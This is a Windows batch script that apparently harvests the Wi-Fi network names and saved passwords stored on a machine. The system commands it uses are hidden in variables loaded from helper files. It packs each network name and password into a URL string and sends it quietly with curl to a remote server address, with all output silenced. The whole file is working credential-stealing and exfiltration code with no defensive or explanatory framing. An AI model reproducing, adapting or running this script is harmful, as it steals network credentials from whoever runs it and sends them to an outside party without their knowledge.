@echo off
setlocal enabledelayedexpansion
cls

call helper.bat %1 %2 %3 %4
if %ERRORLEVEL% equ 101 (
    exit /b
) else (
    call vars.bat %1 %2 %3 %4
)


call :setTabStr

for /f "delims=" %%i in ('%firstCmd%') do (

    set /a IDX=0
    set "LINE=%%i"
    if "!LINE:~0,1!" == "%startDelim%" (
        set /a firstCmdCtr=!firstCmdCtr!+1
    )

    if !firstCmdCtr! equ %firstCmdSN% (
        if not "!LINE:~0,1!" == "%startDelim%" (
            if "!LINE:~0,%tabValue%!" == "!tabStr!" (
                call :getEssid

                set /a secondCmdCtr=0
                set "secondCmdPL="
                
                for /f "delims=" %%j in ('%firstCmd% %secondCmdPartA%"!ESSID!" %secondCmdPartB%') do (
                    set /a IDX=0
                    set "LINE=%%j"
                    if "!LINE:~0,1!" == "%startDelim%" (
                        set /a secondCmdCtr=!secondCmdCtr!+1
                    )
                    
                    if !secondCmdCtr! equ %secondCmdSN% (
                        if not "!LINE:~0,1!" == "%startDelim%" (
                            if "!LINE:~0,%tabValue%!" == "!tabStr!" (
                                set "secondCmdPL=!LINE!"
                            )
                        )
                    ) else (
                        set /a secondCmdPS=%secondCmdSN%+1
                        if !secondCmdCtr! equ !secondCmdPS! (
                            call :getPasswd
                            set /a secondCmdCtr=!secondCmdCtr!+1
                            set "httpData=!httpData!!ESSID!_!PASSWD!_"
                        )
                    )

                )
            )
        )
    )
)

set "httpData=!httpData: =_!"
::echo Result: !httpData!

set "serverAddr=http://!serverAddr!/"
curl -s "!serverAddr!--------------------------------" > nul 2>&1
curl -s "!serverAddr!!httpData!" > nul 2>&1 
curl -s "!serverAddr!--------------------------------" > nul 2>&1


goto :eof


:: labels
:setTabStr
if !tabCtr! lss %tabValue% (
    set /a tabCtr=!tabCtr!+1
    set "tabStr=!tabStr! "
    goto :setTabStr
) else (
    exit /b
)

:getEssid
if "!LINE:~%IDX%,1!" == "%separatorDelim%" (
    set /a IDX=!IDX!+1
    call :showEssid
    exit /b

) else (
    set /a IDX=!IDX!+1
    goto :getEssid
)

:showEssid
if "!LINE:~%IDX%,1!" == " " (
    set /a IDX=!IDX!+1
    goto :showEssid
) else (
    set "ESSID=!LINE:~%IDX%!"
    exit /b
)

:getPasswd
if "!secondCmdPL:~%IDX%,1!" == "%separatorDelim%" (
    set /a IDX=!IDX!+1
    goto :showPasswd
    exit /b
) else (
    set /a IDX=!IDX!+1
    goto :getPasswd
)

:showPasswd
if "!secondCmdPL:~%IDX%,1!" == " " (
    set /a IDX=!IDX!+1
    goto :showPasswd
) else (
    set "PASSWD=!secondCmdPL:~%IDX%!"
    exit /b
)
